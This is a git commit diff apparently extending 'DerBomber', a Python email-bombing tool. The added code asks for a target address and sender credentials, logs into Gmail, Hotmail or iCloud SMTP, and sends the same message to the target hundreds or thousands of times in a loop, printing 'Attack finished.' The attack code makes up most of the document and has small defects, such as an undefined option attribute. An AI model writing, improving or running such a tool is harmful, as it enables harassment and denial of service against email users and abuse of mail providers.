371f774098d238d5616650f176d36cde3ffa35a8
Carlos <carloshenrique20051bb@gmail.com>
2025-02-01 22:48:56 -0300

    Upgrading DerBomber

--- DerBomber.py
+++ DerBomber.py
@@ -14,8 +14,8 @@ class bcolors:
     
 def banner():
     print(bcolors.OKGREEN + '+[+[+[ Bomba-Mail ]+]+]+')
-    print*(bcolors.OKGREEN + '+[+[+[ made with Python')
-    print(bcolors.GREEN + r'''
+    print(bcolors.OKGREEN + '+[+[+[ made with Python')
+    print(bcolors.OKGREEN + r'''
           
                   _____              ____                  _               
  |  __ \            |  _ \                | |              
@@ -69,14 +69,81 @@ class Bomber:
             print(f"Error! {e}")
     
     def bomb(self):
-        self.server = str(input(bcolors.WARNING + "Choose email server/format: 1 - Gmail | 2 - Hotmail | 3 - iCloud "))
-        premade_list = ['1','2','3']
-        default_port = True
-        if self.server not in premade_list:
-            default_port = False
-            self.port = int(input("Enter port number: "))
-        if default_port == True:
-            self.port = int(587)
+       try:
+           print(bcolors.WARNING + 'Setting up bomb: ')
+           self.amount = None
+           if self.options == 1:
+               self.amount = 1000
+           elif self.options == 2:
+               self.amount = 500
+           elif self.options == 3:
+               self.amount = 250
+           elif self.options == 4:
+               self.amount = self.custom 
+       except Exception as e:
+           print(f'ERROR: {e}')    
+            
+            
+    def email(self):
+        try:
+            self.server = str(input(bcolors.WARNING + "Choose email server/format: 1 - Gmail | 2 - Hotmail | 3 - iCloud "))
+            premade_list = ['1','2','3']
+            default_port = True
+            if self.server not in premade_list:
+                default_port = False
+                self.port = int(input("Enter port number: "))
+            else: 
+                if self.server in premade_list:
+                    case = {
+                        '1': ['smtp.gmail.com', 587],
+                        '2': ['smtp.live.com', 587], 
+                        '3': ['smtp.mail.me.com', 587] 
+                    }
+                    self.smtp_server, self.port = case[self.server]
+            print(f"Server: {self.smtp_server} / Port: {self.port}")
+        except Exception as e:
+            print(f"Error! {e}")
+            
+    def send(self):
+        try:
+            self.target = str(input(bcolors.WARNING + "Enter target email:"))
+            self.sender = str(input(bcolors.WARNING + "Enter sender email:"))
+            self.password = str(input(bcolors.WARNING + "Enter sender password: "))
+            self.subject = str(input(bcolors.WARNING + "Enter subject: "))
+            self.message = str(input(bcolors.WARNING + "Enter message: "))
+            
+            self.s = smtplib.SMTP(self.smtp_server,self.port)
+            self.s.starttls()
+            self.s.ehlo()
+            self.s.login(self.sender, self.password)
+            
+            self.msg = f"From: {self.sender}\nTo: {self.target}\n Subject: {self.subject}\n {self.message}"
+            
+            for i in range(self.amount):
+                self.s.sendmail(self.sender,self.target, self.message)
+                print(bcolors.OKGREEN + f"Message sent {i} times")
+            
+            self.s.quit()
+            print(bcolors.OKGREEN + r"Attack finished.")
+        except Exception as e:
+            print(f"Error! {e}")
+            
+    def start(self):
+        try:
+            self.bomb()
+            self.email()
+            self.send()
+        except Exception as e:
+            print(f"Error! {e}")
+        
+
+if __name__ == '__main__':
+    banner()
+    bomb = Bomber()
+    bomb.start()
+    
+            
+                    
             
             
         
